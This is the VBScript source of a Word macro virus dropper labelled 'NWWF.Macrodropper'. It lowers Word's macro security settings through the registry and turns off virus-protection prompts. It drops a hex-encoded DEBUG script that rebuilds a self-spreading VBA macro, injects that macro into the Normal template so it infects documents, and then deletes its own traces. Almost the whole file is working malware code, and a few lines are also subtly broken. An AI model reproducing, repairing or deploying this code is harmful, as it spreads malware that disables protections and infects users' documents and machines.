On Error Resume Next
'NWWF.Macrodropper
'(c)by Necronomikon/Zer0Gravity
Set fso = CreateObject("Scripting.FileSystemObject")
Set WinDir = fso.GetSpecialFolder(0)
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
Set Backup = WScript.CreateObject("Word.Application")
Backup.Options.VirusProtection = (Rnd * 0)
Backup.Options.SaveNormalPrompt = (Rnd * 0)
Set babe = fso.OpenTextFile(WScript.ScriptFullName, 1)
ScriptRead16 = babe.ReadAll
babe.Close

 debug = fso.CreateTextFile ("c:\dbpay.BAT", True)
   debug.WriteLine "rem NWWF.Macrodropper"
   debug.WriteLine "DEBUG<nwwf.nec>NUL"
   debug.WriteLine "del nwwf.nec"
   debug.Close

    
Set DropFile = FSO.CreateTextFile("c:\nwwf.nec", True)
DropFile.WriteLine "e 0100  41 74 74 72 69 62 75 74 65 20 56 42 5F 4E 61 6D"
DropFile.WriteLine "e 0110  65 20 3D 20 22 6E 77 77 66 0D 0A 0D 0A 53 75 62"
DropFile.WriteLine "e 0120  20 6E 77 77 66 28 29 0D 0A 27 56 69 72 75 73 4E"
DropFile.WriteLine "e 0130  61 6D 65 3A 20 6E 77 77 66 0D 0A 27 41 75 74 68"
DropFile.WriteLine "e 0140  6F 72 20 4E 61 6D 65 3A 20 4E 65 63 72 6F 6E 6F"
DropFile.WriteLine "e 0150  6D 69 6B 6F 6E 2F 5A 65 72 30 47 72 61 76 69 74"
DropFile.WriteLine "e 0160  79 0D 0A 4F 6E 20 45 72 72 6F 72 20 52 65 73 75"
DropFile.WriteLine "e 0170  6D 65 20 4E 65 78 74 0D 0A 41 63 74 69 76 65 44"
DropFile.WriteLine "e 0180  6F 63 75 6D 65 6E 74 2E 52 65 61 64 4F 6E 6C 79"
DropFile.WriteLine "e 0190  52 65 63 6F 6D 6D 65 6E 64 65 64 20 3D 20 36 36"
DropFile.WriteLine "e 01A0  20 58 6F 72 20 36 36 0D 0A 41 70 70 6C 69 63 61"
DropFile.WriteLine "e 01B0  74 69 6F 6E 2E 44 69 73 70 6C 61 79 41 6C 65 72"
DropFile.WriteLine "e 01C0  74 73 20 3D 20 77 64 41 6C 65 72 74 73 4E 6F 6E"
DropFile.WriteLine "e 01D0  65 0D 0A 41 70 70 6C 69 63 61 74 69 6F 6E 2E 45"
DropFile.WriteLine "e 01E0  6E 61 62 6C 65 43 61 6E 63 65 6C 4B 65 79 20 3D"
DropFile.WriteLine "e 01F0  20 77 64 43 61 6E 63 65 6C 44 69 73 61 62 6C 65"
DropFile.WriteLine "e 0200  64 0D 0A 41 70 70 6C 69 63 61 74 69 6F 6E 2E 44"
DropFile.WriteLine "e 0210  69 73 70 6C 61 79 53 74 61 74 75 73 42 61 72 20"
DropFile.WriteLine "e 0220  3D 20 35 35 20 58 6F 72 20 35 35 0D 0A 4F 70 74"
DropFile.WriteLine "e 0230  69 6F 6E 73 2E 43 6F 6E 66 69 72 6D 43 6F 6E 76"
DropFile.WriteLine "e 0240  65 72 73 69 6F 6E 73 20 3D 20 34 34 20 58 6F 72"
DropFile.WriteLine "e 0250  20 34 34 0D 0A 4F 70 74 69 6F 6E 73 2E 56 69 72"
DropFile.WriteLine "e 0260  75 73 50 72 6F 74 65 63 74 69 6F 6E 20 3D 20 33"
DropFile.WriteLine "e 0270  33 20 58 6F 72 20 33 33 0D 0A 43 6F 6D 6D 61 6E"
DropFile.WriteLine "e 0280  64 42 61 72 73 28 22 20 4D 61 63 72 6F 20 22 29"
DropFile.WriteLine "e 0290  2E 43 6F 6E 74 72 6F 6C 73 28 22 53 65 63 75 72"
DropFile.WriteLine "e 02A0  69 74 79 2E 2E 2E 22 29 2E 45 6E 61 62 6C 65 64"
DropFile.WriteLine "e 02B0  20 3D 20 32 32 20 58 6F 72 20 32 32 0D 0A 53 79"
DropFile.WriteLine "e 02C0  73 74 65 6D 2E 50 72 69 76 61 74 65 50 72 6F 66"
DropFile.WriteLine "e 02D0  69 6C 65 53 74 72 69 6E 67 28 22 22 2C 20 22 48"
DropFile.WriteLine "e 02E0  4B 45 59 5F 43 55 52 52 45 4E 54 5F 55 53 45 52"
DropFile.WriteLine "e 02F0  5C 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73"
DropFile.WriteLine "e 0300  6F 66 74 5C 4F 66 66 69 63 65 5C 39 2E 30 5C 57"
DropFile.WriteLine "e 0310  6F 72 64 5C 53 65 63 75 72 69 74 79 22 2C 20 22"
DropFile.WriteLine "e 0320  4C 65 76 65 6C 22 29 20 3D 20 31 26 0D 0A 53 79"
DropFile.WriteLine "e 0330  73 74 65 6D 2E 50 72 69 76 61 74 65 50 72 6F 66"
DropFile.WriteLine "e 0340  69 6C 65 53 74 72 69 6E 67 28 22 22 2C 20 22 48"
DropFile.WriteLine "e 0350  4B 45 59 5F 43 55 52 52 45 4E 54 5F 55 53 45 52"
DropFile.WriteLine "e 0360  5C 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73"
DropFile.WriteLine "e 0370  6F 66 74 5C 4F 66 66 69 63 65 5C 31 30 2E 30 5C"
DropFile.WriteLine "e 0380  57 6F 72 64 5C 53 65 63 75 72 69 74 79 22 2C 20"
DropFile.WriteLine "e 0390  22 4C 65 76 65 6C 22 29 20 3D 20 31 26 0D 0A 4F"
DropFile.WriteLine "e 03A0  70 74 69 6F 6E 73 2E 53 61 76 65 4E 6F 72 6D 61"
DropFile.WriteLine "e 03B0  6C 50 72 6F 6D 70 74 20 3D 20 31 31 20 58 6F 72"
DropFile.WriteLine "e 03C0  20 31 31 0D 0A 49 66 20 4E 6F 72 6D 61 6C 54 65"
DropFile.WriteLine "e 03D0  6D 70 6C 61 74 65 2E 56 42 50 72 6F 6A 65 63 74"
DropFile.WriteLine "e 03E0  2E 56 42 43 6F 6D 70 6F 6E 65 6E 74 73 2E 49 74"
DropFile.WriteLine "e 03F0  65 6D 28 22 6E 77 77 66 22 29 2E 4E 61 6D 65 20"
DropFile.WriteLine "e 0400  3C 3E 20 22 6E 77 77 66 22 20 54 68 65 6E 0D 0A"
DropFile.WriteLine "e 0410  41 63 74 69 76 65 44 6F 63 75 6D 65 6E 74 2E 56"
DropFile.WriteLine "e 0420  42 50 72 6F 6A 65 63 74 2E 56 42 43 6F 6D 70 6F"
DropFile.WriteLine "e 0430  6E 65 6E 74 73 28 22 6E 77 77 66 22 29 2E 45 78"
DropFile.WriteLine "e 0440  70 6F 72 74 20 28 22 43 3A 5C 57 69 6E 64 6F 77"
DropFile.WriteLine "e 0450  73 5C 6E 77 77 66 2E 64 72 76 22 29 0D 0A 53 65"
DropFile.WriteLine "e 0460  74 41 74 74 72 20 22 43 3A 5C 57 69 6E 64 6F 77"
DropFile.WriteLine "e 0470  73 5C 6E 77 77 66 2E 64 72 76 22 2C 20 36 0D 0A"
DropFile.WriteLine "e 0480  45 6E 64 20 49 66 0D 0A 49 66 20 41 63 74 69 76"
DropFile.WriteLine "e 0490  65 44 6F 63 75 6D 65 6E 74 2E 56 42 50 72 6F 6A"
DropFile.WriteLine "e 04A0  65 63 74 2E 56 42 43 6F 6D 70 6F 6E 65 6E 74 73"
DropFile.WriteLine "e 04B0  2E 49 74 65 6D 28 22 6E 77 77 66 22 29 2E 4E 61"
DropFile.WriteLine "e 04D0  6E 0D 0A 41 63 74 69 76 65 44 6F 63 75 6D 65 6E"
DropFile.WriteLine "e 04E0  74 2E 56 42 50 72 6F 6A 65 63 74 2E 56 42 43 6F"
DropFile.WriteLine "e 04F0  6D 70 6F 6E 65 6E 74 73 2E 69 6D 70 6F 72 74 20"
DropFile.WriteLine "e 0500  28 22 43 3A 5C 57 69 6E 64 6F 77 73 5C 6E 77 77"
DropFile.WriteLine "e 0510  66 2E 64 72 76 20 22 29 0D 0A 41 63 74 69 76 65"
DropFile.WriteLine "e 0520  44 6F 63 75 6D 65 6E 74 2E 53 61 76 65 0D 0A 45"
DropFile.WriteLine "e 0530  6E 64 20 49 66 0D 0A 4D 73 67 42 6F 78 20 22 28"
DropFile.WriteLine "e 0540  63 29 20 62 79 20 4E 65 63 72 6F 6E 6F 6D 69 6B"
DropFile.WriteLine "e 0550  6F 6E 2F 5A 65 72 30 47 72 61 76 69 74 79 22 2C"
DropFile.WriteLine "e 0560  20 34 38 2C 22 4E 57 57 46 2E 4D 61 63 72 6F 44"
DropFile.WriteLine "e 0570  72 6F 70 70 65 72 22 0D 0A 45 6E 64 20 53 75 62"
DropFile.WriteLine "e 0580  0D 0A 53 75 62 20 41 75 74 6F 43 6C 6F 73 65 28"
DropFile.WriteLine "e 0590  29 0D 0A 4F 6E 20 45 72 72 6F 72 20 52 65 73 75"
DropFile.WriteLine "e 05A0  6D 65 20 4E 65 78 74 0D 0A 43 61 6C 6C 20 6E 77"
DropFile.WriteLine "e 05B0  77 66 0D 0A 45 6E 64 20 53 75 62 0D 0A 00"
DropFile.WriteLine "rcx"
DropFile.WriteLine "4BD"
DropFile.WriteLine "nC:\nwwf.bas"
DropFile.WriteLine "w"
DropFile.WriteLine "q"
DropFile.Close

Backup.Visible = False
Set nt = Backup.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\nwwf.bas", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
Backup.NormalTemplate.Save
SetAttr oword.NormalTemplate.Fullname, vbReadOnly
Backup.NormalTemplate.Close
WSHShell.RegDelete ("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\NWWF")

ran = WSHShell = WScript.CreateObject("WScript.Shell")
ran.Run "dbpay.BAT"
kill "c:\nwwf.bas"

fso.DeleteFile wscript.ScriptFullName